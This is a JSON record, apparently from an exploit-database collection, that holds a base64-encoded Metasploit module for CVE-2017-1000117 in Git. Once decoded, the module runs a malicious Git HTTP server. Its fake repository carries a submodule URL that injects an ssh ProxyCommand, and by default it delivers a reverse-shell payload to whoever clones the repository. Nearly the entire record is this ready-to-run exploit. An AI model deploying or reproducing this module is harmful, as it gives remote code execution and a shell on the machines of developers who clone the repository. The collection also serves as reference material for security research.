{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cHM6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcigNCiAgICAgIHVwZGF0ZV9pbmZvKA0KICAgICAgICBpbmZvLA0KICAgICAgICAnTmFtZScgPT4gJ01hbGljaW91cyBHaXQgSFRUUCBTZXJ2ZXIgRm9yIENWRS0yMDE3LTEwMDAxMTcnLA0KICAgICAgICAnRGVzY3JpcHRpb24nID0+ICVxKA0KICAgICAgICAgICAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgQ1ZFLTIwMTctMTAwMDExNywgd2hpY2ggYWZmZWN0cyBHaXQNCiAgICAgICAgICB2ZXJzaW9uIDIuNy41IGFuZCBsb3dlci4gQSBzdWJtb2R1bGUgb2YgdGhlIGZvcm0gJ3NzaDovLycgY2FuIGJlIHBhc3NlZA0KICAgICAgICAgIHBhcmFtZXRlcnMgZnJvbSB0aGUgdXNlcm5hbWUgaW5jb3JyZWN0bHkuIFRoaXMgY2FuIGJlIHVzZWQgdG8gaW5qZWN0DQogICAgICAgICAgY29tbWFuZHMgdG8gdGhlIG9wZXJhdGluZyBzeXN0ZW0gd2hlbiB0aGUgc3VibW9kdWxlIGlzIGNsb25lZC4NCg0KICAgICAgICAgIFRoaXMgbW9kdWxlIGNyZWF0ZXMgYSBmYWtlIGdpdCByZXBvc2l0b3J5IHdoaWNoIGNvbnRhaW5zIGEgc3VibW9kdWxlDQogICAgICAgICAgY29udGFpbmluZyB0aGUgdnVsbmVyYWJpbGl0eS4gVGhlIHZ1bG5lcmFiaWxpdHkgaXMgdHJpZ2dlcmVkIHdoZW4gdGhlDQogICAgICAgICAgc3VibW9kdWxlcyBhcmUgaW5pdGlhbGlzZWQuDQogICAgICAgICksDQogICAgICAgICdMaWNlbnNlJyA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICAgIFsNCiAgICAgICAgICAgIFsnQ1ZFJywgJzIwMTctMTAwMDExNyddLA0KICAgICAgICAgICAgWydVUkwnLCAnaHR0cDovL3NlY2xpc3RzLm9yZy9vc3Mtc2VjLzIwMTcvcTMvMjgwJyBdDQogICAgICAgICAgXSwNCiAgICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnQXVnIDEwIDIwMTcnLA0KICAgICAgICAnVGFyZ2V0cycgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICBbDQogICAgICAgICAgICAgICdBdXRvbWF0aWMnLA0KICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJ1BsYXRmb3JtJyA9PiBbICd1bml4JyBdLA0KICAgICAgICAgICAgICAgICdBcmNoJyA9PiBBUkNIX0NNRCwNCiAgICAgICAgICAgICAgICAnUGF5bG9hZCcgPT4NCiAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgJ0NvbXBhdCcgPT4NCiAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAnUGF5bG9hZFR5cGUnID0+ICdweXRob24nDQogICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdDQogICAgICAgICAgXSwNCiAgICAgICAgJ0RlZmF1bHRPcHRpb25zJyA9Pg0KICAgICAgICAgIHsNCiAgICAgICAgICAgICdQYXlsb2FkJyA9PiAnY21kL3VuaXgvcmV2ZXJzZV9weXRob24nDQogICAgICAgICAgfSwNCiAgICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwDQogICAgICApDQogICAgKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnR0lUX1VSSScsIFtmYWxzZSwgJ1RoZSBVUkkgdG8gdXNlIGFzIHRoZSBtYWxpY2lvdXMgR2l0IGluc3RhbmNlIChlbXB0eSBmb3IgcmFuZG9tKScsICcnXSksDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ0dJVF9TVUJNT0RVTEUnLCBbZmFsc2UsICdUaGUgcGF0aCB0byB1c2UgYXMgdGhlIG1hbGljaW91cyBnaXQgc3VibW9kdWxlIChlbXB0eSBmb3IgcmFuZG9tKScsICcnXSkNCiAgICAgIF0NCiAgICApDQogIGVuZA0KDQogIGRlZiBzZXR1cA0KICAgIEByZXBvX2RhdGEgPSB7DQogICAgICBnaXQ6IHsgZmlsZXM6IHt9IH0NCiAgICB9DQogICAgc2V0dXBfZ2l0DQogICAgc3VwZXINCiAgZW5kDQoNCiAgZGVmIHNldHVwX2dpdA0KICAgICMgVVJJIG11c3Qgc3RhcnQgd2l0aCBhIC8NCiAgICB1bmxlc3MgZ2l0X3VyaSAmJiBnaXRfdXJpID1+IC9eXC8vDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6QmFkQ29uZmlnLCAnR0lUX1VSSSBtdXN0IHN0YXJ0IHdpdGggYSAvJykNCiAgICBlbmQNCg0KICAgIHBheWxvYWRfY21kID0gcGF5bG9hZC5lbmNvZGVkICsgIiAmIg0KICAgIHBheWxvYWRfY21kID0gUmV4OjpUZXh0LnRvX2hleChwYXlsb2FkX2NtZCwgJyUnKQ0KDQogICAgc3VibW9kdWxlX3BhdGggPSBkYXRhc3RvcmVbJ0dJVF9TVUJNT0RVTEUnXQ0KICAgIGlmIHN1Ym1vZHVsZV9wYXRoLmJsYW5rPw0KICAgICAgc3VibW9kdWxlX3BhdGggPSBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKHJhbmQoOCkgKyAyKS5kb3duY2FzZQ0KICAgIGVuZA0KDQogICAgZ2l0bW9kdWxlcyA9ICJbc3VibW9kdWxlIFwiI3tzdWJtb2R1bGVfcGF0aH1cIl0NCnBhdGggPSAje3N1Ym1vZHVsZV9wYXRofQ0KdXJsID0gc3NoOi8vLW9Qcm94eUNvbW1hbmQ9I3twYXlsb2FkX2NtZH0vDQoiDQogICAgc2hhMSwgY29udGVudCA9IGJ1aWxkX29iamVjdCgnYmxvYicsIGdpdG1vZHVsZXMpDQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdWyIvb2JqZWN0cy8je2dldF9wYXRoKHNoYTEpfSJdID0gY29udGVudA0KDQogICAgdHJlZSA9ICIxMDA2NDQgLmdpdG1vZHVsZXNcMCN7W3NoYTFdLnBhY2soJ0gqJyl9Ig0KICAgIHRyZWUgKz0gIjE2MDAwMCAje3N1Ym1vZHVsZV9wYXRofVwwI3tbc2hhMV0ucGFjaygnSConKX0iDQogICAgc2hhMSwgY29udGVudCA9IGJ1aWxkX29iamVjdCgndHJlZScsIHRyZWUpDQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdWyIvb2JqZWN0cy8je2dldF9wYXRoKHNoYTEpfSJdID0gY29udGVudA0KDQogICAgIyMgYnVpbGQgdGhlIHN1cHBvc2VkIGNvbW1pdCB0aGF0IGRyb3BwZWQgdGhpcyBmaWxlLCB3aGljaCBoYXMgYSByYW5kb20gdXNlci9jb21wYW55DQogICAgZW1haWwgPSBSZXg6OlRleHQucmFuZF9tYWlsX2FkZHJlc3MNCiAgICBmaXJzdCwgbGFzdCwgY29tcGFueSA9IGVtYWlsLnNjYW4oLyhbXlwuXSspXC4oW15cLl0rKUAoLiopJC8pLmZsYXR0ZW4NCiAgICBmdWxsX25hbWUgPSAiI3tmaXJzdC5jYXBpdGFsaXplfSAje2xhc3QuY2FwaXRhbGl6ZX0iDQogICAgdHN0YW1wID0gVGltZS5ub3cudG9faQ0KICAgIGF1dGhvcl90aW1lID0gcmFuZCh0c3RhbXApDQogICAgY29tbWl0X3RpbWUgPSByYW5kKGF1dGhvcl90aW1lKQ0KICAgIHR6X29mZiA9IHJhbmQoMTApDQogICAgY29tbWl0ID0gImF1dGhvciAje2Z1bGxfbmFtZX0gPCN7ZW1haWx9PiAje2F1dGhvcl90aW1lfSAtMCN7dHpfb2ZmfTAwXG4iIFwNCiAgICAgICAgICAgICAiY29tbWl0dGVyICN7ZnVsbF9uYW1lfSA8I3tlbWFpbH0+ICN7Y29tbWl0X3RpbWV9IC0wI3t0el9vZmZ9MDBcbiIgXA0KICAgICAgICAgICAgICJcbiIgXA0KICAgICAgICAgICAgICJJbml0aWFsIGNvbW1pdCB0byBvcGVuIGdpdCByZXBvc2l0b3J5IGZvciAje2NvbXBhbnl9IVxuIg0KDQogICAgc2hhMSwgY29udGVudCA9IGJ1aWxkX29iamVjdCgnY29tbWl0JywgInRyZWUgI3tzaGExfVxuI3tjb21taXR9IikNCiAgICBAcmVwb19kYXRhWzpnaXRdWzpmaWxlc11bIi9vYmplY3RzLyN7Z2V0X3BhdGgoc2hhMSl9Il0gPSBjb250ZW50DQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdWycvSEVBRCddID0gInJlZjogcmVmcy9oZWFkcy9tYXN0ZXJcbiINCiAgICBAcmVwb19kYXRhWzpnaXRdWzpmaWxlc11bJy9pbmZvL3JlZnMnXSA9ICIje3NoYTF9XHRyZWZzL2hlYWRzL21hc3RlclxuIg0KICBlbmQNCg0KICAjIEJ1aWxkJ3MgYSBHaXQgb2JqZWN0DQogIGRlZiBidWlsZF9vYmplY3QodHlwZSwgY29udGVudCkNCiAgICAjIHRha2VuIGZyb20gaHR0cDovL3NjaGFjb24uZ2l0aHViLmlvL2dpdGJvb2svN19ob3dfZ2l0X3N0b3Jlc19vYmplY3RzLmh0bWwNCiAgICBoZWFkZXIgPSAiI3t0eXBlfSAje2NvbnRlbnQuc2l6ZX1cMCINCiAgICBzdG9yZSA9IGhlYWRlciArIGNvbnRlbnQNCiAgICBbRGlnZXN0OjpTSEExLmhleGRpZ2VzdChzdG9yZSksIFpsaWI6OkRlZmxhdGUuZGVmbGF0ZShzdG9yZSldDQogIGVuZA0KDQogICMgUmV0dXJucyB0aGUgR2l0IG9iamVjdCBwYXRoIG5hbWUgdGhhdCBhIGZpbGUgd2l0aCB0aGUgcHJvdmlkZWQgU0hBMSB3aWxsIHJlc2lkZSBpbg0KICBkZWYgZ2V0X3BhdGgoc2hhMSkNCiAgICBzaGExWzAuLi4yXSArICcvJyArIHNoYTFbMi4uNDBdDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgc3VwZXINCiAgZW5kDQoNCiAgZGVmIHByaW1lcg0KICAgICMgYWRkIHRoZSBnaXQgYW5kIG1lcmN1cmlhbCBVUklzIGFzIG5lY2Vzc2FyeQ0KICAgIGhhcmRjb2RlZF91cmlwYXRoKGdpdF91cmkpDQogICAgcHJpbnRfc3RhdHVzKCJNYWxpY2lvdXMgR2l0IFVSSSBpcyAje1VSSS5wYXJzZShnZXRfdXJpKS5tZXJnZShnaXRfdXJpKX0iKQ0KICBlbmQNCg0KICAjIGhhbmRsZXMgcm91dGluZyBhbnkgcmVxdWVzdCB0byB0aGUgbW9jayBnaXQsIG1lcmN1cmlhbCBvciBzaW1wbGUgSFRNTCBhcyBuZWNlc3NhcnkNCiAgZGVmIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxKQ0KICAgICMgaWYgdGhlIFVSSSBpcyBvbmUgb2Ygb3VyIHJlcG9zaXRvcmllcyBhbmQgdGhlIHVzZXItYWdlbnQgaXMgdGhhdCBvZiBnaXQvbWVyY3VyaWFsDQogICAgIyBzZW5kIGJhY2sgdGhlIGFwcHJvcHJpYXRlIGRhdGEsIG90aGVyd2lzZSBqdXN0IHNob3cgdGhlIEhUTUwgdmVyc2lvbg0KICAgIHVzZXJfYWdlbnQgPSByZXEuaGVhZGVyc1snVXNlci1BZ2VudCddDQogICAgaWYgdXNlcl9hZ2VudCAmJiB1c2VyX2FnZW50ID1+IC9eZ2l0XC8vICYmIHJlcS51cmkuc3RhcnRfd2l0aD8oZ2l0X3VyaSkNCiAgICAgIGRvX2dpdChjbGksIHJlcSkNCiAgICAgIHJldHVybg0KICAgIGVuZA0KDQogICAgZG9faHRtbChjbGksIHJlcSkNCiAgZW5kDQoNCiAgIyBzaW11bGF0ZXMgYSBHaXQgSFRUUCBzZXJ2ZXINCiAgZGVmIGRvX2dpdChjbGksIHJlcSkNCiAgICAjIGRldGVybWluZSBpZiB0aGUgcmVxdWVzdGVkIGZpbGUgaXMgc29tZXRoaW5nIHdlIGtub3cgaG93IHRvIHNlcnZlIGZyb20gb3VyDQogICAgIyBmYWtlIHJlcG9zaXRvcnkgYW5kIHNlbmQgaXQgaWYgc28NCiAgICByZXFfZmlsZSA9IFVSSS5wYXJzZShyZXEudXJpKS5wYXRoLmdzdWIoL14je2dpdF91cml9LywgJycpDQogICAgaWYgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdLmtleT8ocmVxX2ZpbGUpDQogICAgICB2cHJpbnRfc3RhdHVzKCJTZW5kaW5nIEdpdCAje3JlcV9maWxlfSIpDQogICAgICBzZW5kX3Jlc3BvbnNlKGNsaSwgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdW3JlcV9maWxlXSkNCiAgICBlbHNlDQogICAgICB2cHJpbnRfc3RhdHVzKCJHaXQgI3tyZXFfZmlsZX0gZG9lc24ndCBleGlzdCIpDQogICAgICBzZW5kX25vdF9mb3VuZChjbGkpDQogICAgZW5kDQogIGVuZA0KDQogICMgc2ltdWxhdGVzIGFuIEhUVFAgc2VydmVyIHdpdGggc2ltcGxlIEhUTUwgY29udGVudCB0aGF0IGxpc3RzIHRoZSBmYWtlDQogICMgcmVwb3NpdG9yaWVzIGF2YWlsYWJsZSBmb3IgY2xvbmluZw0KICBkZWYgZG9faHRtbChjbGksIF9yZXEpDQogICAgcmVzcCA9IGNyZWF0ZV9yZXNwb25zZQ0KICAgIHJlc3AuYm9keSA9IDw8SFRNTA0KICAgICA8aHRtbD4NCiAgICAgIDxoZWFkPjx0aXRsZT5QdWJsaWMgUmVwb3NpdG9yaWVzPC90aXRsZT48L2hlYWQ+DQogICAgICA8Ym9keT4NCiAgICAgICAgPHA+SGVyZSBhcmUgb3VyIHB1YmxpYyByZXBvc2l0b3JpZXM6PC9wPg0KICAgICAgICA8dWw+DQpIVE1MDQogICAgdGhpc19naXRfdXJpID0gVVJJLnBhcnNlKGdldF91cmkpLm1lcmdlKGdpdF91cmkpDQogICAgcmVzcC5ib2R5IDw8ICI8bGk+PGEgaHJlZj0je2dpdF91cml9PkdpdDwvYT4gKGNsb25lIHdpdGggYGdpdCBjbG9uZSAje3RoaXNfZ2l0X3VyaX1gKTwvbGk+Ig0KICAgIHJlc3AuYm9keSA8PCA8PEhUTUwNCiAgICAgICAgPC91bD4NCiAgICAgIDwvYm9keT4NCiAgICA8L2h0bWw+DQpIVE1MDQoNCiAgICBjbGkuc2VuZF9yZXNwb25zZShyZXNwKQ0KICBlbmQNCg0KICAjIFJldHVybnMgdGhlIHZhbHVlIG9mIEdJVF9VUkkgaWYgbm90IGJsYW5rLCBvdGhlcndpc2UgcmV0dXJucyBhIHJhbmRvbSAuZ2l0IFVSSQ0KICBkZWYgZ2l0X3VyaQ0KICAgIHJldHVybiBAZ2l0X3VyaSBpZiBAZ2l0X3VyaQ0KICAgIGlmIGRhdGFzdG9yZVsnR0lUX1VSSSddLmJsYW5rPw0KICAgICAgQGdpdF91cmkgPSAnLycgKyBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKHJhbmQoMTApICsgMikuZG93bmNhc2UgKyAnLmdpdCcNCiAgICBlbHNlDQogICAgICBAZ2l0X3VyaSA9IGRhdGFzdG9yZVsnR0lUX1VSSSddDQogICAgZW5kDQogIGVuZA0KZW5k", 
    "filename": "platforms/python/remote/42599.rb", 
    "id": "42599", 
    "cves": [
        "CVE-2017-1000117"
    ]
}